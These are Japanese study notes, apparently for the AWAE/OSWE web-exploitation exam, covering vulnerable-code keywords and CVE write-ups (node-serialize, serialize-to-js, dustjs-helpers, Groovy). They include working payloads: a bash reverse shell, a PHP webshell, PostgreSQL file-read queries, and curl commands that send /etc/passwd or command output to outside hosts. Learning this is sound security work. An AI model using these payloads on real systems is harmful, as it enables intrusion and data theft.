<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [AWAE-preparation](#awae-preparation)
- [脆弱性発見方法](#%E8%84%86%E5%BC%B1%E6%80%A7%E7%99%BA%E8%A6%8B%E6%96%B9%E6%B3%95)
  - [正規表現](#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE)
  - [キーワード](#%E3%82%AD%E3%83%BC%E3%83%AF%E3%83%BC%E3%83%89)
    - [MySQL](#mysql)
    - [PostgreSQL](#postgresql)
    - [Node.js](#nodejs)
    - [Java Deserialization](#java-deserialization)
    - [Java weak random](#java-weak-random)
    - [ASP.NET](#aspnet)
    - [PHP](#php)
      - [webshell](#webshell)
      - [PHP Deserialization](#php-deserialization)
      - [PHP Type Juggling](#php-type-juggling)
      - [PHP XSS](#php-xss)
      - [PHP XXE](#php-xxe)
      - [PHP SQL Injection](#php-sql-injection)
      - [PHP Directory Traversal](#php-directory-traversal)
      - [PHP LFI](#php-lfi)
      - [PHP Command Injection](#php-command-injection)
      - [その他](#%E3%81%9D%E3%81%AE%E4%BB%96)
    - [Command Injection](#command-injection)
  - [知っておきたいキーワード](#%E7%9F%A5%E3%81%A3%E3%81%A6%E3%81%8A%E3%81%8D%E3%81%9F%E3%81%84%E3%82%AD%E3%83%BC%E3%83%AF%E3%83%BC%E3%83%89)
    - [フレームワーク、ライブラリ](#%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%E3%83%AF%E3%83%BC%E3%82%AF%E3%83%A9%E3%82%A4%E3%83%96%E3%83%A9%E3%83%AA)
    - [いろんなツール](#%E3%81%84%E3%82%8D%E3%82%93%E3%81%AA%E3%83%84%E3%83%BC%E3%83%AB)
      - [監視系](#%E7%9B%A3%E8%A6%96%E7%B3%BB)
      - [データベース系](#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E7%B3%BB)
      - [その他](#%E3%81%9D%E3%81%AE%E4%BB%96-1)
- [Vuln](#vuln)
  - [sample](#sample)
  - [Deserialization](#deserialization)
    - [Apache Groovy (CVE-2015-3253)](#apache-groovy-cve-2015-3253)
    - [nodejs-serialize (CVE-2017-5941)](#nodejs-serialize-cve-2017-5941)
    - [serialize-to-js (Node.js)](#serialize-to-js-nodejs)
  - [Command Injection](#command-injection-1)
    - [dustjs-helper (Node.js)](#dustjs-helper-nodejs)
  - [Information leak](#information-leak)
    - [new Buffer(100); (Node.js)](#new-buffer100-nodejs)
- [その他](#%E3%81%9D%E3%81%AE%E4%BB%96-2)
  - [githubのOSSのディレクトリ構成](#github%E3%81%AEoss%E3%81%AE%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E6%A7%8B%E6%88%90)
  - [dockerでの環境構築](#docker%E3%81%A7%E3%81%AE%E7%92%B0%E5%A2%83%E6%A7%8B%E7%AF%89)
    - [コマンドとかのメモ](#%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%81%A8%E3%81%8B%E3%81%AE%E3%83%A1%E3%83%A2)
    - [nginx + php-fpm](#nginx--php-fpm)
- [メモ](#%E3%83%A1%E3%83%A2)
- [ToDO](#todo)
- [参考資料](#%E5%8F%82%E8%80%83%E8%B3%87%E6%96%99)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# AWAE-preparation

# 脆弱性発見方法
エラー文が出て入れば、その該当箇所のソースコードをgithubで探して、wikiとかTutorialとかissueを見る。   
Injection系はevalを探す。   
見つかれば、ユーザーの入力をエスケープするような部分を`html`,`escape`とかのキーワードで検索して見つける。   

## 正規表現
入力検証を正規表現に依存している場合は、不正なパラメータが来ることを想定されていない正規表現の可能性がある。  
よくわからん正規表現は以下で実際に何が来るかを予想して動かしてみる。  
https://regex101.com/  
  
参考文献  
https://qiita.com/ikmiyabi/items/12d1127056cdf4f0eea5  
https://murashun.jp/article/programming/regular-expression.html  

## キーワード
### MySQL
- `SELECT 'Ä'='a'`はTrueとなる。  
### PostgreSQL
- `select (CASE WHEN ((SELECT CAST(CHR(32)||(SELECT version()) AS NUMERIC))='1') THEN 2 ELSE 3 END)`  
で以下のようなError文に結果が含まれた出力を返す。  
```txt
22P02 invalid input syntax for type numeric: " PostgreSQL 12.4 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 8.3.1 20191121 (Red Hat 8.3.1-5), 64-bit"
```
- `select query_to_xml('select * from pg_user',true,true,'');`  
でXML形式で出力を返す。  
- `select database_to_xml(true,true,'');`  
でデータベース全体を返す。  
- `select pg_ls_dir('.');`  
データベースのカレントディレクトリ`/var/lib/postgresql/10/main`下のファイル一覧を返す。絶対パスや`../`は見れないようになっているが、最新版だとUserの権限によっては見れるようになってる？ 
- `select pg_read_file('/etc/passwd');`  
絶対パスを含むこれは`ERROR:  absolute path not allowed`というエラーになるが最新版では成功することもあるとか？このやり方では絶対パスのファイルは読めないが、largeobjectを使って`lo_import`なら絶対パスでも読み込める！  

### Node.js
`eval`,`eval(`,`html`,`escape`,`new Buffer(`,`unserialize`,`node-serialize`,`deserialize`,`new Function`   
  
`require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.56.2/80 0>%261"')`でRever shell  
記号が欠落してうまく行かないときは以下のようにbase64して送信する。  
`eval(new Buffer.from("Y29uc29sZS5sb2coJ3Rlc3QnKTs=","base64").toString());`  
XSSは`*.ejs`の`<%- %>`みたいにHTMLエスケープせずにデータを表示している箇所。動的にHTMLを作成している場合とかも。  
SQL Injectionは`con.query(  'SELECT * FROM employees WHERE id = ?',  [userid],  (err, rows) => { ... });`みたいに`?`でエスケープせずにSQL文を実行してる場合とか。  
### Java Deserialization
Cookie,パラメータの値,VIEWの値などを確認。RMI,JMX。  
`readObject`,`readExternal`,`readUnshared`,`XStream`,`AC ED`で始まるバイトストリーム,`%C2%AC%C3%AD%00%05`のURLエンコード,`rO0AB`のBase64エンコード(Serializeされたことを示すマジックナンバー)、`ObjectInputStream`,`ObjectOutputStream`,`defaultReadObject`,`org.apache.commons.collections`   
シリアライズされたデータにファイル名が含まれていればそこを`/etc/passwd`とかに変更してファイル改竄。  
loginID的なものが含まれていればそこを`0`とか`1`に変更してみる。  
それでもダメならysoserialのPayloadを試す。  
`Commons Collections`,`Spring`,`CommonsBeanutils`,`Hibernate1`なら見たことある。  
WebLogic, WebSphere, JBoss, Jenkins, OpenNMSはApache Commons Collectionsの脆弱性を受けるバージョンが存在する。  
https://piyolog.hatenadiary.jp/entry/20151110/1447175137  
https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/  
  
`Runtime.exec()`は`ls -al`とかなら普通に実行できるけどRever shell Paylaodみたいな複雑なものは、パイプ、リダイレクト、クオーテーションがあると失敗するっぽい。なので配列として渡したり、工夫したりする。  
### Java weak random
`java.util.Random`クラスのRandom関数によって作成される`Random r1 = new Random(42)`とかはシード(42)が同じならどの環境でも`r1.nextInt()`の値は全く同じ値を出力する  
https://www.jpcert.or.jp/java-rules/msc02-j.html  
tokenとかのセキュリティ関係のやつはこのクラスじゃなくて`java.security.SecureRandom`を使わないとだめ  
`Random r1 = new Random(current_time)`みたいに現在の時刻をシードにしていると予測可能で脆弱  
### ASP.NET 
`XmlSerializer`,`Deserialize`,`Type.GetType`  
`Type.GetType(typeName)`のように外部からここに入力を制御できる場合、DotNetNukeみたいに脆弱かも？  
変数名`DeSerialize`,`hashTable`,`xser`,`xml`  
### PHP
#### webshell
``<?=`$_GET[1]`;``が最短のWebshellらしい。  
記号とかが使えないときは`<?=include"$_COOKIE[0]`でBase64エンコードされたwebshellを`php://filter/convert.base64-decode/resource=path/to/file`でデコードしながら読み込むことでコマンド実行できる！  
#### PHP Deserialization
`unserialize`,`__construct`,`__destruct`,`__wakeup`,`__toString`   
`unserialize`してる箇所があってもその入力に必ず`serlaize`後のデータが入るなら脆弱ではない。  
PHAR形式のファイルをアップロードできてその場所が特定できるなら(ファイル名も)、`file()`,`file_exists()`,`file_get_contents()`,`fopen()`,`rename()`,`unlink()`,`include()`,`getimagesize()`。  
`file_exists`はファイルだけなじゃくてディレクトリもTrueを返す。  
変数名`form`とかで入力がどこにあるのかもわかるかも。PHARファイルの保存先のパスを指定するための変数`path`があるかも。   
`addFile($name,$value)`メソッドの中で`?data[a]=@/etc/passwd`の`/etc/passwd`を`file_get_contents($value);`で読み込んでたりしてた。  
  
PHP 5.6.25 and 7.x before 7.0.10では`__wakeup()`を呼び出さず`__destruct`を呼び出せるらしい。   
- monolog POP gadgestがPHPGCCにある。よく見かける気がする。  
#### PHP Type Juggling
`==`,`!=`,`eval`,`strcasecmp`,`strcmp`  
#### PHP XSS
`$_SERVER['PHP_SELF']`,`preg_replace`,`urldecode`(`$_GET[]で既にdecodeされるので不要`),`htmlspecialchars`(引数無しは`'`をエスケープしない)  
`str_replace`,`preg_replace`は１回しかreplaceしないので`scrscriptipt`とかは`script`になってこれは通す。 
https://vulners.com/myhack58/MYHACK58:62201234463  
https://qiita.com/addictionwhite/items/4e9c9cc4570c0bcaa656  
#### PHP XXE
`file_get_contents`,`loadXML`,`simplexml_load_string`,`svg`,変数名`xml`  
`libxml_disable_entity_loader();`が書かれてるとXXEはできない。  
`simplexml_load_string($string,'SimpleXMLElement', LIBXML_NOENT)`みたいに第三引数がこれになってないと実体参照できないらしい。(なくても良い場合もあるらしい)  
#### PHP SQL Injection
`mysql_real_escape_string`(`mysqli_real_escape_string`は安全?),`mysql_escape_string`(`%`,`_`は通す)  
#### PHP Directory Traversal 
`file_get_contetns`(外部のURLも可),`include`  
変数名`$path`,`$url`,`$image`  
関数名`fetch`が含まれているものは外部からのurl入力したURLにアクセスしてることが多い？(pharの問題で複数)  
`str_replace("../", "", $file);`は一回しか取り除かないので`../`の中に入れ込んだ`..././`でバイパスできる。また、Windows環境では`..\`でDirectry Traversal可能。このチェックをし忘れてることが多い。  
でも大体はそのあとに`path_is_safe($filepath)`みたいにして変なとこに抜けてないかのチェックが入ってる。  

#### PHP LFI
`readfile()`,`file()`,`file_get_contents()`,`fopen()`でファイルを読み込む。PHPファイルを読み込んでも実行はできない。`include`,`require`なら実行可能。    

#### PHP Command Injection
`backtick演算子`(バッククォート),`shell_exec`,`exec`,`passthru`,`system`,`pcntl_exec`,`popen`,`proc_open`,`eval`  
`preg_replace`,`escapeshellcmd`,`escapeshellarg`,`filter_var`  
https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md  
https://gist.github.com/Zenexer/40d02da5e07f151adeaeeaa11af9ab36  
  
`preg_match`は`preg_match('/^\w+$/'`のように`^ $`と書くと、`aaa\n`でも一致する！(最後の改行も通す)  
https://qiita.com/tadsan/items/81b2925b3ed03ae6b7e0  
  
以下でいろいろRCEできるときにPHPでいろいろできる。  
- **RCE** `system("ls -la ./");`, `<?='cat /flag';`  
- **ls** `foreach(new DirectoryIterator('glob:///*') as $f){ echo $f."\n"; }`,`print_r(scandir('./'));`,`var_dump(scandir("/var/www/html"));`  
- **cat** `readfile(glob('*')[0]);`,`eval(system('cat /flag'));`,`show_source('./flag.txt');`,`var_dump(base64_encode(readfile("../../../flag.so")));`  
- 定義済み配列をすべて出す `print_r(get_defined_vars())`  
- blind RCE `$output=shell_exec(\"ls\");shell_exec(\"curl -XPOST -d'data=$output' [url]"\");`  
  
#### その他
https://www.hamayanhamayan.com/entry/2020/08/09/193357  
- `ob_start()`  
`ob_start()`で`ob_end_clean();`までの出力をバッファに入力しておける。これはfatal errorを発生させることで中止できるらしい。  
`O:11:"Traversable":0:{}`をunserializeさせることで、抽象クラスを作ろうとしてエラーを出せるらしい。  
https://wrecktheline.com/writeups/3kctf-2020/#xsser  
- `if ($_GET['a'] !== $_GET['b'] && hash("sha256", $_GET['a']) === hash("sha256", $_GET['b']))`  
https://ctftime.org/task/12375  
`?a[0]=0&b[1]=0`もしくは`?a[]=0&b[]=1`でこの条件に入れるらしい？？？  
- `md5($var1, true)`  
https://ndb796.tistory.com/332  
第二引数に`true`とするとバイナリ形式の出力結果になるらしくて、`mysql_query("select * from users where password='".md5($pass,true)."');`のような実装になっている場合、ハッシュ化したバイナリの中に`'='`という部分が出現すれば、`password='aaa'='bbb'`となってこれはTrueとなる。  
`7201387`をハッシュかしたら`'='`というパターンが中に含まれている！  
- `opcache`  
https://www.sousse.love/post/carthagods-3kctf2020/index.html  
phpinfoが見れて、`opcache.file_cache = /var/www/cache/`となってopchacheがセットされていれば、webroot上に存在する`flag.php`には`/var/www/cache/[system_id]/var/www/html/flag.php.bin`でアクセスできる。このsystem idは`python ./system_id_scraper.py http://carthagods.3k.ctf.to:8039/info.php`みたいにしてこのスクリプトを使って特定できるらしい？？  
- `filter_var($address, FILTER_VALIDATE_EMAIL);`  
https://github.com/w181496/Web-CTF-Cheatsheet#mysql  
`filter_var('aaa."bbb"@b.c',FILTER_VALIDATE_EMAIL)`とかで`aaa."bbb"@b.c`を通すことができる。`aaa."bbb@b.c`なら通さないのに…  
`"'whoami'"@example.com`とかでCommand Injectionにつながるかも。`'||1#@i.i`も通すのでSQL Injectionできるかも。  
- `preg_replace`  
 
- `\x00lambda_%d`  
https://www.cnblogs.com/leixiao-/p/9818602.html  
``$MY = create_function("","die(`cat flag.php`);");``みたいにラムダ関数が定義されているとき、`\x00lambda_49()`みたいにすると同じラムダ関数を実行できるらしい？？  
数字は頑張って探す必要がありそう。  
- `mt_rand()`,`mt_srand()`,`rand()`,`srand()`  
tokenやfinenameにrandとかを使うのはシードが少なすぎるから弱いっぽい  
また、`srand(1234)`とかでシードを与えて生成した後に`rand()`で生成される値はどの環境でも同一  
https://blog.ohgaki.net/php-mt_rand-and-rand-issues   
### Command Injection
`system`,`exec`,`create_function`  

## 知っておきたいキーワード
### フレームワーク、ライブラリ
- cakephp  
MVCベースのPHPのフレームワーク  
- augular  
JavaScriptのフレームワーク。  
`/vendor/angular/angular.min.js`とかを読み込むことでangularの構文で書かれたJSを実行できるようになる？  
`ng`みたいな接頭語が付く？  
http://www.tohoho-web.com/ex/angular.html  
- bootstrap  
Webページのデザイン関係のHTML/CSS/JavaScriptのフレームワーク  
- jquery  
JavaScriptでできることを、より簡単な記法で実現できように設計されたJavaScriptライブラリ  
いろんなPluginがある  
- lodash  
値の操作関連の便利関数があるJavaScriptライブラリ。  
- gridstack  
Dashboard関連のJavaScriptライブラリ？  
- react  
Webサイト上のUIパーツを構築するためのJavaScriptライブラリ  
- symfony  
PHP上で動作するアプリケーションフレームワーク  
- twig  
PHPのテンプレートエンジン
- 


### いろんなツール
#### 監視系
- Nagios  
ネットワークとかのいろんな機能のサーバー監視ツール  
- naemon  
nagionの拡張版の監視ツール  
- Prometheus  
サーバーやインフラなどの監視ツール  
- zabbix  
オープンソースのサーバー監視システム  
- Cacti  
SNMP経由でのリソース情報収集に利用できるツール  
- Hinemos  
複数台のマシンをより効率良く管理することを目的とした「運用管理ツール  

#### データベース系
- Elasticsearch  
オープンソースで開発されている分散型データベースシステムでJavaで実装されている。  
https://knowledge.sakura.ad.jp/2736/  

#### その他
- containerd  
Dockerの内部にあるコンテナランタイム  
- webpack  
JavaScriptとかCSSとかのモジュールバンドラ(複数のファイルを１つにまとめて出力してくれるツール)  
- 
# Vuln
## sample
- 概要   
- 例   
- 発見方法   
- 対策   
- 参考資料   
## Deserialization
### Apache Groovy (CVE-2015-3253)
- 概要   
バージョン1.7.0 through 2.4.3で、MethodClosureクラスがデシリアライズされてしまうことが脆弱。このクラスはインスタンスを作成するだけで任意コマンドを実行できる仕様なので、デシリアライズするだけでRCEできてしまう。   
- 例   
https://github.com/takabaya-shi/AWAE-preparation/blob/main/java/Deserialization/README.md#manually-exploit   
を参照。   
- 発見方法   
Groovyライブラリでコマンドを実行する方法としてMethodClosureクラスがあるので、これがデシリアライズされうるかどうかを調べれば発見できた？(もう遅いけど)   
- 対策   
シリアライズ時のreadResolve()メソッドをオーバーライドして、MethodClosureクラスの場合は再帰的にデシリアライズせずに例外をスローするようにする。   
![image](https://user-images.githubusercontent.com/56021519/102111504-d4f93980-3e79-11eb-8d23-c23a026dfc9d.png)   
- 参考資料   
https://www.sourceclear.com/vulnerability-database/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical   
https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/   
### nodejs-serialize (CVE-2017-5941)
- 概要   
Node.jsのnode-serializeパッケージ0.0.4のunserialize（）関数に渡された信頼できないデータを悪用して、即時呼び出し関数式（IIFE）を使用してJavaScriptオブジェクトを渡すことにより、任意のコードを実行できる。   
https://www.cvedetails.com/cve/CVE-2017-5941/   
cvedetails   
https://github.com/luin/serialize/issues/4   
node-serializeのissue。   
- 例   
```js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())

app.get('/', function(req, res) {
  if (req.cookies.profile) {
    // Cookieのprofileの値をbase64デコード
    var str = new Buffer(req.cookies.profile,
    'base64').toString();
    // ここが脆弱！
    // Cookieの値をbase64デコードしたものを逆シリアライズする
    var obj = serialize.unserialize(str);
    // Cookieの中の値を逆シリアライズによってオブジェクトにして、値を取り出す
    if (obj.username) {
    res.send("Hello " + escape(obj.username));
      }
    } else {
      res.cookie('profile',
      "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5Ijo
      iYmFuZ2Fsb3JlIn0=", { maxAge: 900000, httpOnly: true});
    }
  res.send("Hello World");
});

app.listen(3000);
```
`serialize.unserialize(str)`が脆弱。   
この逆シリアライズする中に、IIFE形式の関数があれば逆シリアライズしたときに呼び出されなくても自動的に実行する。   
```txt
> var x = {'a': function(){console.log('a')}}  // 普通。宣言しただけでは実行されない
undefined
> x.a
[Function: a]
> x.a();  // メソッドを指定して初めて実行される
a
undefined
> var x = {'a': function(){console.log('a')}()}  // IIFE形式。最後に()を足す
a         // 宣言したときにすぐに実行される！
undefined
> 
```
よって、以下のようなシリアライズされた文字列に`()`を付け足してIIFE形式にすることで、逆シリアライズ時に即時実行される。   
ここでは、`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}`をbase64エンコードしたものをCookieにセットするとRCEできる！   
```txt
> var serialize = require('node-serialize');
> var poc = {x: function(){console.log("POC")} }
undefined
> serialize.serialize(poc)
'{"x":"_$$ND_FUNC$$_function(){console.log(\\"POC\\")}"}'
> var y = { rce : function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}, }
undefined
> serialize.serialize(y)
`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}"}`
```

- 発見方法   
`unserialize`,`require('node-serialize')`キーワードが含まれているかどうか。   
`node_modules`ディレクトリの中にversion 0.0.4(おそらく最新版でも)の`node-serialize`ディレクトリがあるかどうか。   
- 対策   
`node-serialize`モジュールは最新版でもおそらく修正されてない。   
https://www.npmjs.com/package/node-serialize   
- 参考資料   
https://blacksheephacks.pl/nodejs-deserialization/   
説明。   
https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf   
説明。   
https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py   
`eval(String.fromCharCode(10,118,...,10))`の形式で書けばクウォートとかを使わずにReverse shellのコードが書ける。   
https://v3ded.github.io/ctf/htb-celestial   
HTBのWriteup。   
- 根本の原因   
このソースの`unserialize`関数の`eval`が良くない。   
https://github.com/luin/serialize/blob/master/lib/serialize.js   
```js
  var FUNCFLAG = '_$$ND_FUNC$$_';
  
  // ここら辺は省略
  
  // objは {"a":"test1","b":"test2"} とか
  unserialize = function(obj, originObj) {
    var isIndex;
    if (typeof obj === 'string') {
      obj = JSON.parse(obj);
      isIndex = true;
    }
    originObj = originObj || obj;

    var circularTasks = [];
    var key;
    // objオブジェクトのプロパティをkeyに代入。 "a","b"が順次代入される    
    for(key in obj) {
      if(obj.hasOwnProperty(key)) {
        if(typeof obj[key] === 'object') {
          obj[key] = unserialize(obj[key], originObj);
          // obj["a"]つまり"test1"がString型かどうかチェック
        } else if(typeof obj[key] === 'string') {
          // indexOfで"_$$ND_FUNC$$_"の位置を検査。先頭にあるかどうか
          if(obj[key].indexOf(FUNCFLAG) === 0) {
            // ここが脆弱！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
            // substringで"_$$ND_FUNC$$_"以降の文字を切り出して、evalで実行！
            obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
          } else if(obj[key].indexOf(CIRCULARFLAG) === 0) {
            obj[key] = obj[key].substring(CIRCULARFLAG.length);
            circularTasks.push({obj: obj, key: key});
          }
        }
      }
    }

    if (isIndex) {
      circularTasks.forEach(function(task) {
        task.obj[task.key] = getKeyPath(originObj, task.obj[task.key]);
      });
    }
    return obj;
  };
```
### serialize-to-js (Node.js)
- 概要   
serialize-to-jsモジュールのversion 1.0.0以前で、deserializeメソッドでIIFE形式によるRCEの脆弱性がある。   
https://snyk.io/vuln/npm:serialize-to-js:20170208   
- 例   
以下を挿入するとRCEできる！   
```js
var payload = "{e: function(){ eval('console.log(`exploited`)') }() }";
```
- 対策   
修正されてる。現在のバージョンは
- 根本の原因   
ここに該当のissueがある。   
https://github.com/commenthol/serialize-to-js/commit/1cd433960e5b9db4c0b537afb28366198a319429   
![image](https://user-images.githubusercontent.com/56021519/101511405-fb246280-39bd-11eb-9dd2-468226ae1b2e.png)   
`new Function`によって関数オブジェクトが作成されて、IIFE形式によって作成されたら即実行されてしまう。   
```js
var payload = "{e: function(){ eval('console.log(`exploited`)') }() }";
// もともとの脆弱な実装
var str = (new Function('return ' + payload))();

// 結果
// exploited
```
修正バージョンでは`sanitize()`関数が実装されて、`new`,`eval`,`function`,`(`,`)`のキーワードを構文解析して、あるかどうか調べている。   
![image](https://user-images.githubusercontent.com/56021519/101512873-dda3c880-39be-11eb-8c91-4f159defc157.png)   

## Command Injection
### dustjs-helper (Node.js)
- 概要   
dustというNodeJSのモジュールの中の拡張機能であるdustjs-helper.jsというテンプレートエンジンのための便利メソッドがあるライブラリの中のifメソッドが脆弱だった。   
Javascriptのevalの中にユーザーの入力が入り込んでRCEできてしまう。   
htmlescapeはあるにはあるが、String型にしかチェックがされてないのでArray型にして入力すればHtmlEscape無しに入力できてしまう。   
- 例   

- 発見方法   
`/us/demo/navigation?device=desktop\`(%5c)を入力すると、500 internal errorが発生して、`scripts/node_modules/dustjs-helpers/lib/dust-helpers.js`の`Object.helpers.if`でSyntaxErrorが発生していることがわかる。   
なので、次は`dustjs-helpers/lib/dust-helpers.js`をgithubの公式で読む。   
`/dist`,`/lib`のどっちでも同じっぽい？？   
https://github.com/linkedin/dustjs-helpers/blob/03cd65f51a/dist/dust-helpers.js   
https://github.com/linkedin/dustjs-helpers/blob/03cd65f51a/lib/dust-helpers.js      
![image](https://user-images.githubusercontent.com/56021519/101359047-0eaccc00-38df-11eb-8c19-3e7b986d5b5b.png)   
`if helper`で検索すると該当箇所が見つかり、`eval`があることがわかる。   
if helperの挙動を確認するために、dustjsのgithubの**wiki**の**Dust tutorial**を読む。   
https://github.com/linkedin/dustjs/wiki/Dust-Tutorial#if_condcondition__if_helper_Removed_in_160_release   
見た感じ条件式をevalの中に入れてるっぽいらしい。   
つまり、`\`を入れると、`eval("'desktop\' === 'desktop'")`となってSyntaxErrorとなる。   
![image](https://user-images.githubusercontent.com/56021519/101359923-423c2600-38e0-11eb-875c-ce9b66c0bf69.png)   
任意のコマンドを実行するには`\`以外にも`'`とかも使う必要がある。ので、htmlEscapeする箇所を探して、そこら辺を探す。   
`escape`,`html`とかのキーワードで探すとよさそう？？   
https://github.com/linkedin/dustjs/blob/master/dist/dust-core.js   
どうやら`String`型の時しかEscapeされてないらしい。   
![image](https://user-images.githubusercontent.com/56021519/101360732-69dfbe00-38e1-11eb-9cfd-e98794fedb98.png)   
`?device=desktop`みたいにパラメータを渡す代わりに、`?device[]=1&device[]=2`みたいにして`Array`型でパラメータを渡せばEscapeされずにそのままevalまでたどり着きそう！   
Array型いきなり渡してもいいんだ…！？ふーん。   
`?device[]=x&device[]=y'-require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+artsploit.com')-'`   
とするとRCEできるらしい！！！   
これは以下のようになるから。   
```js
// 元はこれ
eval("  ''  == 'desktop'  ")

// 上にPayloadを挿入するとこうなる。-は文字列の引き算？
> eval("  'y'-require('child_process').exec('cat /etc/passwd > ../nodejs/output')-''  == 'desktop'  "); 
false

// +でも-でもどっちでもよさそう
> eval("  'y'+require('child_process').exec('cat /etc/passwd > ../nodejs/output')+''  == 'desktop'  "); 
false
> 
```
- 対策   
evalの入力検証を実装する。htmlEscapeはString型だけじゃなくてすべての型で行う。   
- 参考資料   
https://artsploit.blogspot.com/2016/08/pprce2.html   
https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/   

## Information leak
### new Buffer(100); (Node.js)
- 概要   
Node.jsで以下のように`new Buffer(req.body.text)`でバッファを作成した場合、`req.body.text`の型がString型でない場合、Bufferはnewで使用される前に初期化されないので、サーバーのメモリを返す脆弱性。   
- 例   
```js
> console.log(new Buffer('aaaa'));
<Buffer 61 61 61 61>
undefined
> console.log(new Buffer(100));
<Buffer 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ... 50 more bytes>
undefined
>
```
つまり、ログイン処理で以下のようになっており、POST形式にはJSONが使われている場合、リクエストを細工することでメモリをリークできる。   
```js
        var password = new Buffer(req.body.password);
        if(password.toString('base64') == config.secret_password) {
            req.session.admin = 'yes';
            res.json({'status': 'ok' });
        } else {
            res.json({'status': 'error', 'error': 'password wrong: '+password.toString() });
            
// POSTするデータ
// {"password":"test"} // 文字列"test"を送信。通常
// {"password":100}    // 数値100を送信。Buffer(100)が.toString()によってリークされる
```
- 発見方法   
`new Buffer();`が書かれている箇所を探す。   
- 対策   
`new Bufffer()`は危険なのでBufferの代わりに、Buffer.fromとBuffer.allocとBuffer.allocUnsafeが追加された。   
Buffer.allocUnsafeは初期化されないが、それ以外は初期化されるっぽい。   
- 参考資料   
https://techblog.yahoo.co.jp/advent-calendar-2016/node_new_buffer/   
概要   
https://www.smrrd.de/nodejs-hacking-challenge-writeup.html   
Writeup   
# その他
## githubのOSSのディレクトリ構成
- bin   
プロジェクトで使用する、各種コマンド置き場   
- dist   
コンパイルされたコード/ライブラリ。public/またはbuild/とも呼ばれる。通常、本番用または公共用のファイル。ライブラリ本体置き場（ビルド時に自動作成される）。配付するもの   
- lib   
外部依存関係（直接含まれる場合）。外部ライブラリ置き場   
- include   
C/C++ヘッダー   
- test   
プロジェクトのテストスクリプト、モックなど。性能チェックとか。   
- src   
プロジェクトをビルドおよび開発するための「ソース」ファイル。これは、dist/、public/、またはbuild/にコンパイルされる前の元のソースファイルの場所。   
- examples   
使用例。   
- vendor   
Composerが使用するPHPパッケージのライブラリと依存関係が含まれる。   
- contrib   
他の人からの貢献   
- doc   
ドキュメント   
- man   
マニュアル（Unix/Linux）   
  
https://qiita.com/y_hokkey/items/871c23c24d31021d7c40  
## dockerでの環境構築
### コマンドとかのメモ
以下、Windows10のDockerToolBoxを使用して、Dockerサーバー自体はVirtualBox上のVMで動かすことを想定。   
- `Dockerサーバー起動`   
`Docker QuickStart Terminal`をクリックして起動。いろいろ出るが、VirtualBox上でDockerサーバーを立ち上げてプロンプトが返ってくるまでちょっと待つ。プロンプト自体はWindows10だけど、`docker`コマンドとかで作ったイメージとかは全部VM上に保存される。   
- `docker images`   
今Dockerサーバーに保存されているイメージを表示する。   
- `docker container ls -a`   
今Dockerサーバーに保存されてるコンテナを表示する。   
- `docker-machine ip default`   
DockerサーバーのIPアドレスを確認する。localhostではなくて`192.168.99.100`とか。   
- `docker container run -d --rm -it -p 10080:80 コンテナID`   
今あるDockerコンテナを実行する。`--rm`で起動後そのコンテナを削除する。`-it`でコンテナに対して操作可能とする。`-p 10080:80`でホストOSの10080ポートをDockerサーバーの80ポートに接続する。`-d`でデーモンを起動する。   
- `docker ps`   
今Dockerサーバー上で動いているコンテナを表示する。   
- `docker-machine ssh`   
HostOSからDockerサーバーにSSHログインする。   
- `docker attach 0b5aad08487b`   
HostOSからDockerサーバーのシェルに入る。   
- `docker exec -it c9eb1f0daf24 /bin/sh`   
Dockerコンテナに入る。(Dockerサーバーではない！)   
- `docker build .`   
現在のディレクトリ上にある`Dockerfile`を実行してDockerイメージを作成する。イメージはDockerサーバー上の`/mnt/sda1/var/lib/docker`に保存されている。   
DockerイメージとはOS的なアプリケーションを動かすためのもので、ファイルの内容は変更できない。ファイルの変更が保存されたりするのはイメージレイヤーに追加するコンテナレイヤー側。この二つが合わさってDockerコンテナ。   
- `docker-compose up -d`   
現在のディレクトリ上にある`docker-compose.yml`を実行する。このファイルにはイメージを作成してそれをさらにコンテナにして実行する処理が書かれている。   
コンテナを新規作成する。   
- `docker-compose start`   
既にあるコンテナを起動する。   
- `docker cp my.cnf <コンテナID>:/etc/my.cnf`   
ホストからコンテナ内にファイルを送信する。   
my.cnfを`.`にすれば現在のファイルすべてを送信する。   
ディレクトリを指定すれば、そのディレクトリをそのままコピーして同じ名前のディレクトリを作成して中身のファイルも再帰的に送信する。   
- `docker commit`   
Dockerコンテナをイメージ化する。   
- `docker-compose down`   
コンテナとネットワークを停止、削除する。   
- `docker-compose down --rmi all`  
